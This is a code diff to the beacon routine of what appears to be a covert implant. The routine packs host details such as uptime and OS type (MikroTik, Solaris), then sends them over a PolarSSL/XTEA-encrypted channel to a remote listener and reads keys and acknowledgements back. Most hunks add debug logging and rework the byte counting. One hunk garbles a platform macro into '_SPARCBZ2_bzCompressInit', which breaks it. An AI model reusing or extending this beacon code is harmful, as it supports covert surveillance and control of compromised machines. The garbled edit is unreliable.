@@ -1,3 +1,5 @@
+#include <stdio.h>
+
 #include "polarssl/ssl.h"
 #include "polarssl/havege.h"
 #include "polarssl/xtea.h"
@@ -237,7 +239,8 @@ void *beacon(void* param)
 		if(ret == SUCCESS)
 		{
 			update_file((char*)sdfp);
-		}
+		} else
+			DLX(4, printf( "\tSend of beacon data failed\n"));
 #ifdef __VALGRIND__
 	if ( ++counter > 10 ) goto not_reached;
 #endif
@@ -328,7 +331,7 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 	bhdr.os = htons(MIKROTIK_X86);
 	#endif
 #elif defined SOLARIS
-	#if defined _SPARC
+	#if defined _SPARCBZ2_bzCompressInit
 	bhdr.os = htons(SOLARIS_SPARC);
 	#elif defined _X86
 	bhdr.os = htons(SOLARIS_X86);
@@ -627,11 +630,15 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 	//receive the buffer
 	memset(randData, 0, 64);
 
-	if( 0 > recv(sock,(char*)randData,37,0))
+	retval = recv(sock,(char*)randData,37,0);
+	if (retval < 0)
 	{
+		DLX(4, printf( "\tReceive failed:"));
+		perror("1");
 		retval = FAILURE;
 		goto EXIT;
 	}
+	DLX(4, printf( "\tReceived %d bytes\n", retval));
 
 	//extract the key
 	extract_key(randData + 5,key);
@@ -672,16 +679,31 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 		retval = crypt_write( &ssl, enc_buf + bytes_sent, sz_to_send);
 		if( retval < 0)
 		{
+			DLX(4, printf("\tcrypt_write() failed with error: %0x\n", retval));
 			retval = FAILURE;
 			goto EXIT;
 		}
+
+		bytes_sent += retval;
+		DLX(4, printf("\tTotal bytes sent: %d, %d to go\n", bytes_sent, encrypt_size-bytes_sent));
 
 		//receive ack
 		memset(recv_buf, 0, 30);
 
 		retval = recv(sock, recv_buf,30,0);
+		if (retval < 0)
+		{
+			DLX(4, printf( "\tReceive failed:"));
+			perror("2");
+			retval = FAILURE;
+			goto EXIT;
+		}
+		DLX(4, printf( "\tReceived %d bytes\n", retval));
+
 		recv_sz = atoi(recv_buf + (sizeof(SSL_HDR) - 1));
-		bytes_sent += recv_sz;
+		DLX(4, printf("\tAck bytes sent: %d\n", recv_sz));
+
+		//bytes_sent += recv_sz;
 
 	} while (bytes_sent < encrypt_size);
 
